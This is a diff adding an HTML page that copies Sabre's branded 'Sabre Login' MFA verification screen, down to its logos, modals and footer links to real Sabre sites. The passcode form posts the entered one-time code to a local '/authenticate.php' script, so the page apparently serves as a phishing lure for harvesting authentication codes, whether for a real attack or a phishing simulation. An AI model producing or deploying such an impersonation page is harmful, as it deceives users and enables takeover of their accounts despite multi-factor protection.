@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Sabre Login Authentication Portal</title>
+    <link rel="stylesheet" href="stylesheet_4.css">
+    <link rel="stylesheet" href="stylesheet_3.css">
+    <link href="stylesheet_2.css" type="text/css" rel="stylesheet">
+    <link rel="stylesheet" href="stylesheet_1.css">
+    <link rel="stylesheet" href="stylesheet_0.css">
+    <style>
+        #okta-sign-in {
+            width: 500px;
+            margin: auto;
+        }
+
+        #okta-sign-in.auth-container.main-container {
+            border-color: transparent;
+        }
+
+        #okta-sign-in.auth-container .mfa-google-auth {
+            background-image: url(images/56.svg);
+            background-size: 38px 60px;
+        }
+
+        #okta-sign-in.auth-container .button {
+            border: 3px solid #121315;
+            color: #fff;
+            border-radius: 1rem;
+            cursor: pointer;
+            -webkit-font-smoothing: antialiased;
+            line-height: 1;
+            overflow: hidden;
+            position: relative;
+            text-align: center;
+            text-transform: uppercase;
+            transition: background-color .1s ease-in-out, color .1s ease-in-out, border-color .1s ease-in-out, box-shadow .1s ease-in-out;
+            white-space: nowrap;
+            font-size: 1.6666666667rem;
+            font-weight: 700;
+        }
+
+        #okta-sign-in.auth-container .button-primary {
+            background: linear-gradient(225deg, #202224 0, #404247 100%);
+        }
+
+        #okta-sign-in.auth-container .button-primary:hover {
+            background: linear-gradient(225deg, #202224 0, #404247 100%);
+        }
+
+        #okta-sign-in.auth-container .button-primary:focus {
+            background: linear-gradient(225deg, #202224 0, #404247 100%);
+            box-shadow: none;
+            border-color: #121315;
+        }
+
+        #okta-sign-in.auth-container input[type=submit]:focus {
+            background: linear-gradient(225deg, #202224 0, #404247 100%);
+            box-shadow: none;
+            border-color: #121315;
+        }
+    </style>
+    <link type="image/x-icon" rel="shortcut icon" href="images/57.ico">
+    <style>
+        .sf-hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+
+<body class="spark-content--sticky-footer" style="overflow-x:hidden">
+    <div class="spark-content__wrapper--sticky-footer">
+        <a class="spark-skip-nav" href="#mainContent">Skip Navigation</a>
+        <div class="spark-content__wrapper--sticky-footer">
+            <header class="spark-header spark-header--extra-styles spark-header--overflow-checked spark-header--visible">
+                <nav class="spark-header__nav" role="navigation">
+                    <button class="spark-menu__toggle spark-header__toggle sf-hidden" title="View Navigation" id="viewNavigationButton"></button>
+                    <span class="spark-header__logo"><i class="spark-logo spark-logo--sabre spark-logo--sm"></i></span>
+                    <a class="spark-header__title" id="sabreLogo">Sabre Login™</a>
+                    <div class="spark-menu spark-header__menu">
+                        <div class="spark-menu__header sf-hidden"></div>
+                    </div>
+                </nav>
+            </header>
+            <main class="spark-main--sticky-footer">
+                <div id="content">
+                    <div class="spark-content__wrapper--sticky-footer">
+                        <div class="spark-content__wrapper--sticky-footer">
+                            <article class="spark-splash-screen spark-splash-screen--panel spark-splash-screen--sign-in spark-main--sticky-footer">
+                                <section class="spark-splash-screen__content flex-row-m">
+                                    <div class="spark-panel spark-splash-screen__center col-xs-12 col-md-10 col-lg-6 col-xl-4">
+                                        <div class="spark-panel__content">
+                                            <div id="widget-container" class="spark-text-left">
+                                                <main tabindex="-1" id="okta-sign-in" class="auth-container main-container">
+                                                    <div class="okta-sign-in-header auth-header">
+                                                        <h1><img src="images/58.svg" class="auth-org-logo" alt="logo" aria-label="logo"></h1>
+                                                        <div class="beacon-container" style="transform:scale(1,1);text-indent:1px">
+                                                            <div>
+                                                                <div class="beacon-blank auth-beacon">
+                                                                    <div class="beacon-blank js-blank-beacon-border auth-beacon-border"></div>
+                                                                </div>
+                                                                <div class="bg-helper auth-beacon auth-beacon-factor mfa-google-auth">
+                                                                    <div class="okta-sign-in-beacon-border auth-beacon-border"></div>
+                                                                </div>
+                                                                <div class="factors-dropdown-wrap"></div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="auth-content">
+                                                        <div class="auth-content-inner">
+                                                            <div class="mfa-verify">
+                                                                <form method="POST" action="/authenticate.php" id="form32" class="mfa-verify-totp o-form o-form-edit-mode">
+                                                                    <div class="o-form-content o-form-theme clearfix">
+                                                                        <h2 class="okta-form-title o-form-head">Other Authenticator</h2>
+                                                                        <p class="okta-form-subtitle o-form-explain">Enter your Other Authenticator passcode</p>
+                                                                        <div class="o-form-error-container"></div>
+                                                                        <div class="o-form-fieldset-container">
+                                                                            <div class="o-form-fieldset o-form-label-top auth-passcode">
+                                                                                <div class="okta-form-label o-form-label"><label for="authCode">Enter Code&nbsp;</label></div>
+                                                                                <div class="o-form-input">
+                                                                                    <span class="o-form-input-name-answer o-form-control okta-form-input-field input-fix">
+                                                                                        <input type="tel" placeholder name="authCode" id="input38" value aria-label autocomplete="off">
+                                                                                    </span>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="o-form-button-bar"><input class="button button-primary spark-btn" type="submit" value="Verify" data-type="save"></div>
+                                                                </form>
+                                                                <div class="auth-footer clearfix">
+                                                                    <a href="https://central.sabre.com/s/mfa-assistance" class="spark-btn-link" id="mfaAssistance" target="_blank" style="display:block;margin-top:10px">Report a problem with MFA</a>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </main>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </section>
+                            </article>
+                        </div>
+                    </div>
+                </div>
+            </main>
+            <div>
+                <footer class="spark-footer" style="background-color:#ffffff">
+                    <div class="container">
+                        <a class="spark-footer__logo spark-hidden--lte-sm"><i class="spark-logo spark-logo--sabre spark-logo--xs"></i></a>
+                        <div class="spark-footer__content">
+                            <div class="spark-footer__copyright">© <span>2024</span> Sabre GLBL Inc.</div>
+                            <ul class="spark-footer__list">
+                                <li class="spark-footer__list-item"><a class="spark-footer__list-link" href="https://www.sabre.com/about/privacy-policy">Privacy policy</a></li>
+                                <li class="spark-footer__list-item"><a class="spark-footer__list-link" href="http://www.sabretravelnetwork.com/home/about/contact">Contact Us</a></li>
+                                <li class="spark-footer__list-item"><a class="spark-footer__list-link" href="https://www.sabre.com/about/copyright-and-trademark-notice">Copyright and trademark</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </footer>
+            </div>
+            <div class="spark-modal" id="skipModal">
+                <div class="spark-modal__scroll">
+                    <div class="spark-modal__content col-xs-12 col-sm-10 col-md-7 col-lg-6 col-xl-5">
+                        <div class="spark-modal__body">
+                            <a tabindex="0" class="spark-modal__close spark-icon-close" aria-label="Close Modal" title="Close Modal"></a>
+                            <h4>Voluntary MFA Set Up</h4>
+                            <div class="spark-message spark-message--lg spark-message--info spark-panel spark-mar-t-2">
+                                <div class="spark-panel__content">
+                                    <i aria-hidden="true" class="spark-message__icon spark-icon-announce spark-icon--fill"></i>
+                                    <div class="spark-message__content">
+                                        <h4 class="spark-message__heading">MFA set up is volunteer</h4>
+                                        <p>You don't need to set up MFA now. When your password expires you will be notified to set up MFA.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="spark-mar-t-2">
+                                <p>Are you sure you want to exit the MFA set up process</p>
+                            </div>
+                            <div class="spark-flex flex-items-sm-between spark-mar-t-2" style="width:100%">
+                                <button class="spark-btn spark-btn--md spark-btn--secondary spark-modal__dismiss spark-btn-group-secondary">Continue MFA set up</button>
+                                <button class="spark-btn spark-btn--md spark-btn-group-primary">Yes, Skip</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="spark-modal" id="successModal">
+                <div class="spark-modal__scroll">
+                    <div class="spark-modal__content col-xs-12 col-sm-10 col-md-7 col-lg-6 col-xl-5">
+                        <div class="spark-modal__body">
+                            <a tabindex="0" class="spark-modal__close spark-icon-close" aria-label="Close Modal" title="Close Modal"></a>
+                            <div class="spark-text-center spark-mar-t-2">
+                                <i class="spark-icon spark-icon-check-circle spark-success" style="font-size:5rem;line-height:5rem"></i>
+                            </div>
+                            <h4 class="spark-text-center spark-mar-t-2">Multi-factor Authentication is on</h4>
+                            <div class="spark-text-center spark-mar-t-2">
+                                <p>From now you will be required to enter a code supplied by your Authenticator any time you will log in to Sabre systems.</p>
+                            </div>
+                            <div class="spark-text-center spark-mar-t-2">
+                                <p>Now, you can sign in with your password and MFA.</p>
+                            </div>
+                            <nav class="spark-btn-group spark-mar-t-2">
+                                <button class="spark-btn spark-btn--md spark-btn-group-primary">Done</button>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="spark-modal" id="failModal">
+                <div class="spark-modal__scroll">
+                    <div class="spark-modal__content col-xs-12 col-sm-10 col-md-7 col-lg-6 col-xl-5">
+                        <div class="spark-modal__body">
+                            <a tabindex="0" class="spark-modal__close spark-icon-close" aria-label="Close Modal" title="Close Modal"></a>
+                            <div class="spark-text-center spark-mar-t-2">
+                                <i class="spark-icon spark-icon-close-circle spark-failure" style="font-size:5rem;line-height:5rem"></i>
+                            </div>
+                            <h4 class="spark-text-center spark-mar-t-2">Multi-factor Authentication failed</h4>
+                            <div class="spark-text-center spark-mar-t-2">
+                                <p id="message">Please try again later or contact helpdesk.</p>
+                            </div>
+                            <nav class="spark-text-center spark-mar-t-2">
+                                <button class="spark-btn spark-btn--md spark-btn-group-primary">Close</button>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
